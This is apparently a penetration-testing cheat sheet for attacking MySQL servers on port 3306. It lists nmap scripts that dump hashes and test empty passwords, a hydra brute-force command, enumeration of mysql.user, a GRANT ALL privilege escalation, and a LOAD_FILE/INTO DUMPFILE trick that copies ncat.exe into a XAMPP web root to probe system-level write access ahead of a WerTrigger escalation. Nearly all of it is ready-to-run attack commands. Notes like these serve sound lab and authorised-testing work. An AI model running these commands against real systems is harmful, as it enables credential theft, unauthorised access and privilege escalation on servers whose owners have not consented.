# MySQL

Port 3306

### 1) Nmap scan

    nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" IP

### 2) Netexec


    netexec mysql -d DATABASE -u USERNAME -p PASSWORD -x "SHOW DATABASES;" IP

### 3) Brute force

    hydra -l USER -P PASSWORD_LIST -s 3306 IP mysql

### 4) Login

    mysql -h IP -u USER -p DATABASE

Skip SSL errors

    mysql -h IP -u USER -p --skip_ssl

### 5) Database Usage

    SHOW DATABASES;
    
    USE <database_name>;
    
    SHOW TABLES;
    
    DESCRIBE <table_name>;
    
    SELECT * FROM <table_name>;

### 6) Exploitation

Database enumeration

    SELECT user FROM mysql.user;

Privilege Escalation

    GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
    FLUSH PRIVILEGES;

### 7) Check System permissions of the DB User


#### 1. Copy an already existing file from Windows to another location

    SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';

#### 2. Check permissions of the new written file

    icacls 'C:\\xampp\htdocs\nc.exe'

#### 3. An output like the one below indicates that the file was written with admin privileges, therefore the DB user has admin privilege (consider WerTrigger exploit for escalation).

    nc.exe WinServer\\apache:(I)(F)  
        NT AUTHORITY\\SYSTEM:(I)(F)  
        BUILTIN\\Administrators:(I)(F)  
        BUILTIN\\Users:(I)(RX)  
    Successfully processed 1 files; Failed processing 0 files
